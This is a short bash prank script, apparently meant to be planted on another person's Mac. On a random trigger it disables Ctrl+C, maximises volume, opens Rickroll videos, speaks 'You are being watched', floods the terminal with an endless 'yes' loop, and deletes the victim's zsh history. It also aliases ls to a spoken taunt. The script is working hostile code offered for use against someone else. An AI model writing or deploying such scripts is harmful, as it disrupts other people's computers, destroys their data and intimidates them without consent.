#!/bin/bash

# 10% chance to hit them again just for fun
if [ $(( RANDOM % 10 )) -eq 3 ]; then
    
    # Disable Ctrl+C
    trap '' INT  

    # Max volume (macOS)
    osascript -e "set volume output volume 100"

    # Max brightness (requires `brightness` utility)
    if command -v brightness &> /dev/null; then
        brightness 1.0
    fi

    open -na "Google Chrome" --args "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
    open -na "Google Chrome" --args "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

    say "You are being watched"
    yes "You are being rickrolled hahaahhahahahahahahahahahaahahahhahahahahahahaahhaahahahahahah"

    rm -f ~/.zsh_history && touch ~/.zsh_history
    history -c
fi


unalias ls 2>/dev/null
alias ls='say "Where are your files?" && /bin/ls'
# chmod +x ~/.rickroll.sh
